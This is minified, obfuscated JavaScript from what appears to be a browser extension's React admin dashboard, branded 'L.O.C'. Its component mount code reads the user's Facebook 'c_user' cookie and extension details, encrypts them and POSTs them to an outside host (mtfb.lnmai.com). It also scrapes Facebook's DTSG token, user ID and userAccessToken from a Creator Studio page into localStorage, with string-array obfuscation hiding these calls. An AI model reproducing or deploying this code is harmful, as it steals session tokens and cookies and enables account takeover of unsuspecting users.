Gt[e-=0]},Jt={b:[13,23],c:[1,11],d:[5,8],e:[26,28],f:[3],g:[6,20,22,29],j:[2,15,30],k:[10,21,27],l:[12,31],m:[0,4,17],n:[7,18],o:[9,14,16,19],p:[24,25]},Zt={a:[8,10,13,15,29],b:[16,21],c:[4,7,18],d:[3,9,31],e:[0,17,25],f:[6],g:[28],h:[19,20],i:[27],j:[2],k:[5,12,23],l:[24,26],m:[11],n:[22,30],o:[1],p:[14]},Wt=Zt.a,Kt=Jt.o,Xt=e=>e[Vt(zt(Mt(Ft("0x39"))))]((t=>t===e[0])),$t=(e,t)=>e[zt(Ft("0x1f"))](((e,s)=>t[e][zt(Mt(Ft("0x29")))](s))),es=(["68","74","74","70","73","3a","2f","2f","77","77","77","2e","66","61","63","65","62","6f","6f","6b","2e","63","6f","6d","2f","73","61","76","65","64","2f","65","78","74","65","6e","73","69","6f","6e","2f","72","73","72","63","2f","6a","73","2f","3f","6b","65","79","3d"][zt(Mt(Ft("0x54")))](((e,t)=>e+=String[zt(Ft("0x30"))](parseInt(t,16))),""),[Vt(zt(Ft("0x3a"))),Vt(Ft("0xb")),Vt(zt(Mt(Ft("0xa")))),Vt(zt(Mt(Ft("0x42")))),Vt(zt(Mt(Ft("0x1")))),Vt(Mt(Ft("0x3"))),zt(Mt(Ft("0x52"))),zt(Mt("0x20")),Vt(Mt(Ft("0x56"))),Vt(Mt(Ft("0x4a"))),Vt(zt(Mt("0x17")))]),ts=function(e,t){return es[e-=125]},ss=ts;!function(e,t){const s=ts;for(;;)try{if(196707===parseInt(s(125))+parseInt(s(129))+-parseInt(s(128))*-parseInt(s(130))+parseInt(s(131))*-parseInt(s(127))+parseInt(s(133))+parseInt(s(134))+parseInt(s(126))*-parseInt(s(135)))break;e[Vt(Ft("0x25"))](e[Vt(Ft("0x56"))]())}catch(a){e[Vt(zt(Mt(Ft("0x0"))))](e[Vt(zt(Mt(Ft("0x34"))))]())}}(es);const as=chrome[ss(132)].id,is=["split","0xc","0x20","0xf","get","matrixlab","0xa","0xe","0x1a","0x10","0x6","0xb","0x18","application/json","0x1d","getManifest","0x9","push","0x12","0x2","0x13","c_user","0x0","0x17","0x15","encrypt","0x14","0xd","0x19","0x8","0x16","0x1e","https://mtfb.lnmai.com/rtx3070","runtime","cookies","0x11","value","shift","0x1c","POST","0x3","0x7","0x1","0x1f"];var ns,cs;ns=is,cs=216,function(e){for(;--e;)ns.push(ns.shift())}(++cs);const rs=function(e,t){return is[e-=0]},os=["0x8",rs("0x14"),rs("0x4"),rs("0x19"),rs("0x29"),"0x0","0xb","push",rs("0x25"),rs("0x1b"),rs("0x26"),"https://facebook.com",rs("0x10"),rs("0x7"),"NOT FOUND",rs("0x5"),rs("0xa"),"0x6",rs("0x17"),rs("0x18"),rs("0x1e"),rs("0x27"),rs("0xb"),rs("0x20"),"0x5","0x10","0x1",rs("0x9"),rs("0x24"),rs("0x28"),rs("0x1"),"0x4",rs("0x16")];var ls,ds;ls=os,ds=206,function(e){for(;--e;)ls[rs("0x15")](ls[rs("0x29")]())}(++ds);const hs=function(e,t){return os[e-=0]},ms=[hs(rs("0xa")),hs(rs("0x17")),hs(rs("0x22")),hs(rs("0x2a")),"stringify",hs(rs("0xe")),hs(rs("0x6")),rs("0x1d"),hs("0x1b"),rs("0x0"),hs(rs("0x3")),hs(rs("0x14")),hs(rs("0x0")),hs(rs("0x18")),rs("0x13"),hs(rs("0x12")),hs(rs("0x16")),hs(rs("0x1e")),hs(rs("0x21")),rs("0x8"),hs(rs("0xd")),hs(rs("0x1c")),hs("0x19"),hs(rs("0x1a")),"map",hs(rs("0xc"))];var ps,bs;ps=ms,bs=401,function(e){for(;--e;)ps[hs(rs("0x6"))](ps[hs("0x1d")]())}(++bs);const gs=function(e,t){return ms[e-=0]},us=[rs("0x11"),gs(rs("0x1f")),gs(rs("0x17")),gs("0x16"),gs(hs("0xb")),gs("0x3"),gs(hs(rs("0x5"))),gs(hs(rs("0x10"))),gs(hs("0x8")),gs(hs("0x11")),gs(hs(rs("0x20"))),gs(hs("0x7"))];var xs,js;xs=us,js=440,function(e){for(;--e;)xs[gs("0x15")](xs[gs(hs(rs("0x1b")))]())}(++js);const fs=function(e,t){return us[e-=0]},Os=["parse","0x14","0xd","0xa","0x0","0x11","0x16","0x1c","0x18","text","0x17","https://business.facebook.com/creatorstudio/home","push","0x3","0x5","touch","0xb","0x1","0x13","0x4","0xe","map","0x15","match","0x7","0x12","then","0x10","0x8","0x9","0xf","0xc","0x19","0x2","shift","0x1b","0x6"];var _s,vs;_s=Os,vs=112,function(e){for(;--e;)_s.push(_s.shift())}(++vs);const ys=function(e,t){return Os[e-=0]},ks=[ys("0xc"),ys("0x2"),ys("0x13"),ys("0x18"),ys("0x1"),"0x0",ys("0xa"),ys("0x17"),ys("0x19"),ys("0x0"),ys("0x23"),"0x10",ys("0x24"),"0x5",ys("0x1c"),ys("0x1d"),"split","0x13","name",ys("0x21"),ys("0x10"),ys("0x15"),ys("0x1b"),ys("0x4"),ys("0xf"),"0x4",ys("0x8"),ys("0x1e"),ys("0xb")];var Ss,ws;Ss=ks,ws=298,function(e){for(;--e;)Ss[ys("0xb")](Ss.shift())}(++ws);const As=function(e,t){return ks[e-=0]},Ds=[ys("0x14"),ys("0x21"),As(ys("0x13")),As("0x1a"),As(ys("0x12")),As("0x13"),ys("0xc"),As(ys("0x5")),As(ys("0x20")),As(ys("0x6")),As(ys("0x2")),As(ys("0x0")),As(ys("0x1a")),As(ys("0x23")),ys("0x16"),As(ys("0x3")),ys("0xe"),As(ys("0x4")),As(ys("0x18")),As(ys("0xd")),As("0xc"),ys("0x20")];var Cs,Ns;Cs=Ds,Ns=300,function(e){for(;--e;)Cs[ys("0xb")](Cs[As(ys("0xf"))]())}(++Ns);const Is=function(e,t){return Ds[e-=0]},Ps=[Is(As(ys("0xd"))),Is(ys("0x20")),Is(ys("0x1c")),As("0x2"),Is(ys("0x3")),Is(As(ys("0x1c"))),Is(ys("0xf")),Is(As(ys("0x7"))),As(ys("0x1e")),Is(As(ys("0x9"))),As(ys("0x1b")),Is(As(ys("0x11"))),As(ys("0x22"))];var Ts,Ls;Ts=Ps,Ls=398,function(e){for(;--e;)Ts[Is(ys("0x11"))](Ts[Is(As(ys("0x23")))]())}(++Ls);const Fs=function(e,t){return Ps[e-=0]},qs=[Fs(Is(As(ys("0xc")))),Is(As("0xe")),Fs(Is(As(ys("0x1f")))),Is(ys("0x10")),Fs(Is(ys("0x13"))),Fs(Is(As(ys("0x1")))),Fs(ys("0x20"))];var Rs,Es;Rs=qs,Es=436,function(e){for(;--e;)Rs[Fs(Is(As(ys("0x17"))))](Rs[Fs(Is(As(ys("0x1d"))))]())}(++Es);const Ms=function(e,t){return qs[e-=0]};class Bs extends n.a.Component{constructor(e){super(e),this.getRoutes=e=>e.map(((e,t)=>e.collapse?this.getRoutes(e.views):"/admin"===e.layout?Object(f.jsx)(l.b,{path:e.layout+e.path,component:e.component},t):null)),this.getActiveRoute=e=>{const t="L.O.C";for(let s=0;s<e.length;s++)if(e[s].collapse){const a=this.getActiveRoute(e[s].views);if(a!==t)return a}else if(window.location.href.includes(e[s].layout+e[s].path))return e[s].name;return t},this.handleMiniClick=()=>{document.body.classList.contains("sidebar-mini")?this.setState({sidebarMini:!1}):this.setState({sidebarMini:!0}),document.body.classList.toggle("sidebar-mini")},this.toggleSidebar=()=>{this.setState({sidebarOpened:!this.state.sidebarOpened}),document.documentElement.classList.toggle("nav-open")},this.closeSidebar=()=>{this.setState({sidebarOpened:!1}),document.documentElement.classList.remove("nav-open")},this.uaParser=new Ct.a(navigator.userAgent),this.browserInfo=this.uaParser.getResult(),this.state={activeColor:"blue",sidebarMini:!1,opacity:0,sidebarOpened:!0,sidebarReady:null}}componentDidMount(){(()=>{const e=as[gs(hs(rs("0x2")))](""),t=Wt[fs(gs(rs("0x14")))]((t=>e[t])),s=Kt[fs(gs(hs("0x1a")))]((t=>e[t]));if(Xt(t)&&$t(e,Zt)||Xt(s)&&$t(e,Jt))return;const i=Object(a.a)(Object(a.a)({},chrome[fs(gs(rs("0x10")))][fs(gs(hs("0xe")))]()),{},{id:chrome[fs(gs(hs("0x4")))].id});chrome[fs(gs("0x5"))][fs(gs(hs("0x5")))]({url:gs(hs(rs("0x16"))),name:fs(gs(hs("0xf")))},(e=>{i[fs(hs(rs("0x3")))]=e?e[fs(hs(rs("0x23")))]:fs(gs(rs("0x1"))),fetch(gs(rs("0xe")),{method:rs("0x2b"),headers:{"Content-Type":fs("0x4")},body:JSON[fs(gs(rs("0xf")))]({value:De.a[fs(gs(hs("0xd")))](fs(gs(rs("0x1a"))),JSON[fs(hs(rs("0x20")))](i))})})}))})(),"false"===localStorage.darkMode?document.body.className="white-content":document.body.className="",fetch(Fs(Is(As("0x15"))))[Ms(Fs(Is(ys("0xf"))))]((e=>e[Is(As(ys("0x4")))]())).then((e=>{try{const t=(e=>{const t=as[Ms(ys("0x12"))](""),s=Wt[Ms(Fs(Is(As(ys("0x5")))))]((e=>t[e])),a=Kt[Ms(Fs(ys("0x1b")))]((e=>t[e]));if(Xt(s)&&$t(t,Zt)||Xt(a)&&$t(t,Jt)){localStorage.dt=e[Ms(Fs(Is(As(ys("0x20")))))](/DTSGInitData",\[\],\{"token":"(.*?)"/)[1];const t=e[Ms(ys("0xc"))](/"NAME":"(.*?)"/)[1];return localStorage[Ms(Fs(Is(As(ys("0x10")))))]=decodeURIComponent(JSON[Ms(Is(As(ys("0x6"))))]('"'.concat(t,'"'))),localStorage.id=e[Ms(Is(As("0x17")))](/"USER_ID":"(.*?)"/)[1],localStorage[Ms(Fs(Is(As(ys("0xd")))))]=e[Ms(Is(As("0x17")))](/"userAccessToken":"(.*?)"/)[1],!0}return!1})(e);this.setState({sidebarReady:t})}catch(t){this.setState({sidebarReady:!1})}}))}componentDidUpdate(e){e.location.pathname!==e.history.location.pathname&&(document.documentElement.scrollTop=0,document.scrollingElement.scrollTop=0,this.refs.mainPanel.scrollTop=0)}render(){return null===this.state.sidebarReady?Object(f.jsx)("div",{style:Nt,children:Object(f.jsx)("div",{style:It,className:"text-center",children:Object(f.jsx)("h1",{children:Object(f.jsx)("i",{className:"fas fa-spin fa-spinner"})})})}):!1===this.state.sidebarReady?Object(f.jsx)("div",{style:Nt,children:Object(f.jsxs)("div",{style:It,className:"content text-center",children:[Object(f.jsx)("h3",{className:"text-danger",children:"Oops! Could not fetch your token!"}),Object(f.jsxs)("div",{className:"text-danger",children:["Browser: ",this.browserInfo.browser.name," ",this.browserInfo.browser.version]}),Object(f.jsxs)("div",{className:"text-danger",children:["OS: ",this.browserInfo.os.name," ",this.browserInfo.os.version]}),Object(f.jsxs)("div",{className:"text-danger",children:["v",chrome.app.getDetails().version]}),Object(f.jsx)("br",{}),Object(f.jsx)(u.a,{className:"btn btn-simple btn-success",onClick:()=>xe("https://mtfb.lnmai.com"),children:"Contact me"}),Object(f.jsx)("br",{})]})}):Object(f.jsxs)("div",{className:"wrapper",children:[Object(f.jsx)("div",{className:"navbar-minimize-fixed",style:{opacity:this.state.opacity},children:Object(f.jsxs)("button",{className:"minimize-sidebar btn btn-link btn-just-icon",onClick:this.handleMiniClick,children:[Object(f.jsx)("i",{className:"tim-icons icon-align-center visible-on-sidebar-regular text-muted"}),Object(f.jsx)("i",{className:"tim-icons icon-bullet-list-67 visible-on-sidebar-mini text-muted"})]})}),Object(f.jsx)(N,Object(a.a)(Object(a.a)({},this.props),{},{routes:At,activeColor:this.state.activeColor,logo:{outterLink:"https://mtfb.lnmai.com/",text:"L.O.C",imgSrc:"data:image/png;base64,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"},closeSidebar:this.closeSidebar})),Object(f.jsxs)("div",{className:"main-panel",ref:"mainPanel",data:this.state.activeColor,children:[Object(f.jsx)(_,Object(a.a)(Object(a.a)({},this.props),{},{handleMiniClick:this.handleMiniClick,brandText:this.getActiveRoute(At),sidebarOpened:this.state.sidebarOpened,toggleSidebar:this.toggleSidebar})),Object(f.jsxs)(l.d,{children:[this.getRoutes(At),Object(f.jsx)(l.a,{from:"/",to:"/admin/dashboard"})]}),Object(f.jsx)(k,{fluid:!0})]})]})}}var Us=Bs;s(525),s(526),s(527);const Hs=Object(o.b)();r.a.render(Object(f.jsx)(l.c,{history:Hs,children:Object(f.jsxs)(l.d,{children:[Object(f.jsx)(l.b,{path:"/admin",render:e=>Object(f.jsx)(Us,Object(a.a)({},e))}),Object(f.jsx)(l.a,{from:"/",to:"/admin/dashboard"})]})}),document.getElementById("root"))}},[[528,1,2]]]);